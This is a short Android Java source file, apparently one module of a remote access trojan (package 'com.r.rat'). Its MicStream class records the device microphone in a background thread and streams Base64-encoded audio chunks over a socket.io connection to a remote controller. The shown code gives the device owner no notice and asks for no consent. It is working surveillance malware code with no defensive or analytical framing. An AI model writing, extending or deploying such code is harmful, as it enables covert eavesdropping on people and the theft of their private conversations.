package com.r.rat;
import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import io.socket.client.Socket;
import java.util.Base64;
public class MicStream {
    private static Thread t; private static volatile boolean run;
    public static void start(Context c, Socket s) {
        if (run) return; run = true;
        t = new Thread(() -> {
            int rate = 16000;
            int minBuf = AudioRecord.getMinBufferSize(rate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.MIC,
                rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, minBuf * 4);
            ar.startRecording();
            byte[] buf = new byte[minBuf];
            while (run) {
                int n = ar.read(buf, 0, buf.length);
                if (n > 0) {
                    byte[] slice = new byte[n];
                    System.arraycopy(buf, 0, slice, 0, n);
                    s.emit("mic", Base64.getEncoder().encodeToString(slice));
                }
            }
            ar.stop(); ar.release();
        });
        t.start();
    }
    public static void stop() { run = false; }
}